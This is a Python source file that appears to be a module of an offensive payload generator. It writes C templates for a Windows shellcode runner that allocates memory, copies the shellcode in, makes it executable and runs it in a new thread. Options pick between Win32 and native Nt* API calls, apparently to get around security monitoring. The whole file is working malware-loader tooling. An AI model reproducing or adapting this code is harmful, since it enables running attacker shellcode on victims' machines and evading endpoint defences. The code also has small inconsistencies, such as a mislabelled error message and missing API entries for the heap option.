from string import Template

class shellcoderunner:
    def __init__(self, arguments):
        self.apicallsList = ['CloseHandle']

        self.memoryPermission = 'PAGE_EXECUTE_READ'
        if 'perm' in arguments:
            if arguments['perm'] == 'rwx':
                self.memoryPermission = 'PAGE_EXECUTE_READWRITE'

        self.allocation = 'VirtualAlloc'
        if 'allocation' in arguments:
            if arguments['allocation'] in ['VirtualAlloc', 'HeapAlloc', 'NtAllocateVirtualMemory']:
                self.allocation = arguments['allocation']
            else:
                print('Allocation argument must be VirtualAlloc, HeapAlloc, or NtAllocateVirtualMemory')
                exit(0)
        if self.allocation == 'VirtualAlloc':
            self.allocationCode = """
    LPVOID buffer = {VirtualAlloc}(NULL, {shellcodeSize}, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
"""
            self.freeCode = """
    {VirtualFree}(buffer, 0, MEM_RELEASE);
"""
            self.apicallsList += ['VirtualAlloc', 'VirtualFree']
        elif self.allocation == 'HeapAlloc':
            self.allocationCode = """
    HANDLE hHeap = {HeapCreate}(0, {shellcodeSize}, 0);
    LPVOID buffer = {HeapAlloc}(hHeap, HEAP_ZERO_MEMORY, {shellcodeSize});
"""
            self.freeCode = """
    {HeapFree}(hHeap, 0, buffer);
    {HeapDestroy}(hHeap);
"""
        elif self.allocation == 'NtAllocateVirtualMemory':
            self.allocationCode = """
    PVOID buffer = NULL;
    SIZE_T allocationSize = {shellcodeSize};
    {NtAllocateVirtualMemory}((HANDLE)-1, &buffer, 0, &allocationSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
"""
            self.freeCode = """
    {NtFreeVirtualMemory}((HANDLE)-1, &buffer, 0, MEM_RELEASE);
"""
            self.apicallsList += ['NtAllocateVirtualMemory', 'NtFreeVirtualMemory']

        self.execution = 'CreateThread'
        if 'execution' in arguments:
            if arguments['execution'] in ['CreateThread', 'NtCreateThreadEx']:
                self.execution = arguments['execution']
            else:
                print('Execution argument must be CreateThread or NtCreateThreadEx')
                exit(0)
        if self.execution == 'CreateThread':
            self.executionCode = """
    HANDLE hThread = {CreateThread}(NULL, 0, (LPTHREAD_START_ROUTINE)buffer, NULL, 0, NULL);
"""
            self.apicallsList += ['CreateThread']
        elif self.execution == 'NtCreateThreadEx':
            self.executionCode = """
    HANDLE hThread;
    {NtCreateThreadEx}(&hThread, THREAD_ALL_ACCESS, NULL, (HANDLE)-1, (PVOID)buffer, NULL, 0, (SIZE_T)0, (SIZE_T)0, (SIZE_T)0, NULL);
"""
            self.apicallsList += ['NtCreateThreadEx']

        self.copy = 'memcpy'
        if 'copy' in arguments:
            if arguments['copy'] in ['memcpy', 'NtWriteVirtualMemory']:
                self.copy = arguments['copy']
            else:
                print('Copy argument must be memcpy or NtWriteVirtualMemory')
                exit(0)
        if self.copy == 'memcpy':
            self.copyCode = """
    memcpy(buffer, shellcode, {shellcodeSize});
"""
        elif self.copy == 'NtWriteVirtualMemory':
            self.copyCode = """
    SIZE_T bytesWritten = 0;
    {NtWriteVirtualMemory}((HANDLE)-1, buffer, shellcode, {shellcodeSize}, &bytesWritten);
"""
            self.apicallsList += ['NtWriteVirtualMemory']

        self.protect = 'VirtualProtect'
        if 'protect' in arguments:
            if arguments['protect'] in ['VirtualProtect', 'NtProtectVirtualMemory']:
                self.protect = arguments['protect']
            else:
                print('Protect argument must be WaitForSingleObject or NtWaitForSingleObject')
                exit(0)
        if self.protect == 'VirtualProtect':
            self.protectCode = Template("""
    DWORD oldProtect;
    {VirtualProtect}(buffer, {shellcodeSize}, $memoryPermission, &oldProtect);
""").substitute(memoryPermission=self.memoryPermission)
            self.apicallsList += ['VirtualProtect']
        elif self.protect == 'NtProtectVirtualMemory':
            self.protectCode = Template("""
    SIZE_T size = {shellcodeSize};
    ULONG OldProtect; 
    {NtProtectVirtualMemory}((HANDLE)-1, &buffer, &size, $memoryPermission, &OldProtect);
""").substitute(memoryPermission=self.memoryPermission)
            self.apicallsList += ['NtProtectVirtualMemory']

        self.wait = 'WaitForSingleObject'
        if 'wait' in arguments:
            if arguments['wait'] in ['WaitForSingleObject', 'NtWaitForSingleObject']:
                self.wait = arguments['wait']
            else:
                print('Wait argument must be WaitForSingleObject or NtWaitForSingleObject')
                exit(0)
        if self.wait == 'WaitForSingleObject':
            self.waitCode = """
    {WaitForSingleObject}(hThread, INFINITE);
"""
            self.apicallsList += ['WaitForSingleObject']
        elif self.wait == 'NtWaitForSingleObject':
            self.waitCode = """
    LARGE_INTEGER li = {{ 0 }};
    li.QuadPart = -1;
    {NtWaitForSingleObject}(hThread, FALSE, NULL);
"""
            self.apicallsList += ['NtWaitForSingleObject']

        self.close = 'CloseHandle'
        if 'close' in arguments:
            if arguments['close'] in ['CloseHandle', 'NtClose']:
                self.close = arguments['close']
            else:
                print('Close argument must be CloseHandle, or NtClose')
                exit(0)
        if self.close == 'CloseHandle':
            self.closeCode = """
    {CloseHandle}(hThread);
"""
            self.apicallsList += ['CloseHandle']
        elif self.close == 'NtClose':
            self.closeCode = """
    {NtClose}(hThread);
"""
            self.apicallsList += ['NtClose']


    def imports(self) -> list[str]:
        return ["#include <windows.h>", 
                "#include <stdio.h>", 
                "#include <stdlib.h>",
                '#include "spawnandinject.h"']

    def compilerOptions(self) -> list[str]:
        return []
    
    def codeblocks(self) -> str:
        return ''

    def apicalls(self) -> list[str]:
        return self.apicallsList

    def template(self) -> str:
        return Template("""
    {transformers}
    $allocation
    $copy
    $protect
    $execution
    $wait
    $close
    $free
""").substitute(allocation=self.allocationCode, free=self.freeCode, execution=self.executionCode, protect=self.protectCode, copy=self.copyCode, wait=self.waitCode, close=self.closeCode)